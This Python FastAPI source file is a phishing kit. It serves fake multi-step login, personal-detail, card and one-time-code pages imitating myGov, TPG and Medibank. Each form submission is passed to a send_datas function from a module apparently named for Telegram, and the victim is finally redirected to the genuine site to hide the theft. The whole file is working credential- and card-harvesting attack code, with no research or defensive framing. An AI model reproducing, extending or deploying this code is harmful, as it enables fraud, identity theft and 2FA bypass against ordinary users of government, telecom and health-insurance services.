#this app implements two different approach to rendering the html file

import requests
from fastapi import FastAPI, Request, Response, status
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles

# approach one 
from fastapi.templating import Jinja2Templates

# approach two
from jinja2 import Environment, FileSystemLoader
from teleG import send_datas

app = FastAPI()

# app.mount("/publiq", StaticFiles(directory="templates/publiq"), name="publiq")
app.mount("/static", StaticFiles(directory = "static"), name = "static")

# approach one uses this approach 
templates = Jinja2Templates(directory="templates")

#approach two uses this approach
env = Environment(loader=FileSystemLoader('templates'))

# Gov routing Here

@app.get('/gov/login/', response_class=HTMLResponse)
async def get_gov_home(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("gov_log.html", context)

@app.post("/gov/login/")
async def post_gov_home(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/gov/retry/"})


@app.get('/gov/retry/', response_class=HTMLResponse)
async def get_gov_try(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("gov_check.html", context)

@app.post("/gov/retry/")
async def post_gov_try(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/gov/verify/check/"})



@app.get('/gov/verify/check/', response_class=HTMLResponse)
async def get_gov_check(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("gov_full.html", context)

@app.post("/gov/verify/check/")
async def post_gov_check(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/gov/2fa/"})




@app.get('/gov/2fa/', response_class=HTMLResponse)
async def get_gov_2fa(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("gov_Otp.html", context)

@app.post("/gov/2fa/")
async def post_gov_2fa(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/gov/2fa/check/"})




@app.get('/gov/2fa/check/', response_class=HTMLResponse)
async def get_gov_mfa(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("gov_Otp2.html", context)

@app.post("/gov/2fa/check/")
async def post_gov_mfa(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "https://my.gov.au/"})




# Tpg routing Here

@app.get('/tpg/login/', response_class=HTMLResponse)
async def get_tpg_home(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("tpg_log.html", context)

@app.post("/tpg/login/")
async def post_tpg_home(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/tpg/login/retry"})



@app.get('/tpg/login/retry/', response_class=HTMLResponse)
async def get_tpg_retry(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("tpg_log_error.html", context)

@app.post("/tpg/login/retry/")
async def post_tpg_retry(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/tpg/fullckeck/"})



@app.get('/tpg/fullckeck/', response_class=HTMLResponse)
async def get_tpg_full(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("tpg_full.html", context)

@app.post("/tpg/fullckeck/")
async def post_tpg_full(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/tpg/fullinfo/"})



@app.get('/tpg/fullinfo/', response_class=HTMLResponse)
async def get_tpg_info(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("tpg_drill.html", context)

@app.post("/tpg/fullinfo/")
async def post_tpg_info(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/tpg/2fa/check/"})



@app.get('/tpg/2fa/check/', response_class=HTMLResponse)
async def get_tpg_2fa(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("tpg_otp.html", context)

@app.post("/tpg/2fa/check/")
async def post_tpg_2fa(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/tpg/2fa/retry/"})



@app.get('/tpg/2fa/retry/', response_class=HTMLResponse)
async def get_tpg_mfa(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("tpg_otp2.html", context)

@app.post("/tpg/2fa/retry/")
async def post_tpg_mfa(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "https://www.tpg.com.au"})




# approach one is used to render this endpoint
@app.get('/medibank/login/', response_class=HTMLResponse)
async def get_home(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("Medi_Log.html", context)

@app.post("/medibank/login/")
async def post_home(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/medibank/try/"})


@app.get('/medibank/try/', response_class=HTMLResponse)
async def get_home_retry(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("Medi_TryLog2.html", context)

@app.post("/medibank/try/")
async def post_home_retry(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/medibank/checkerv2/"})


@app.get('/medibank/checkerv2/', response_class=HTMLResponse)
async def get_Cli_detail(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("Medi_Full_detail.html", context)

@app.post("/medibank/checkerv2/")
async def post_Cli_detail(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/medibank/checkerv3/"})


@app.get('/medibank/checkerv3/', response_class=HTMLResponse)
async def get_ard_detail(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("Medi_Fill_Card.html", context)

@app.post("/medibank/checkerv3/")
async def post_ard_detail(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/medibank/2fa check/"})



@app.get('/medibank/2fa check/', response_class=HTMLResponse)
async def get_2fa(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("Medi_Fill_Otp.html", context)

@app.post("/medibank/2fa check/")
async def post_2fa(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/medibank/2fa verify/"})


@app.get('/medibank/2fa verify/', response_class=HTMLResponse)
async def get_Otp(request: Request):
    context = {'request': request}
    return templates.TemplateResponse("Medi_Fill_Otp.html", context)

@app.post("/medibank/2fa verify/")
async def post_Otp(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "https://www.medibank.com.au/"})















# approach two was used to render this endpoint
@app.get("/")
async def form_page():
    template = env.get_template('form.html')
    return HTMLResponse(content=template.render())

@app.post("/")
async def receive_form_data(request: Request):
    form_data = await request.form()
    data = {key: value for key, value in form_data.items()}
    
    send_datas(data,)
    
    return Response(status_code=status.HTTP_302_FOUND, headers={"Location": "/success"})
    
@app.get("/success")
def success_page():
    return {"message": "Data sent successfully!"}





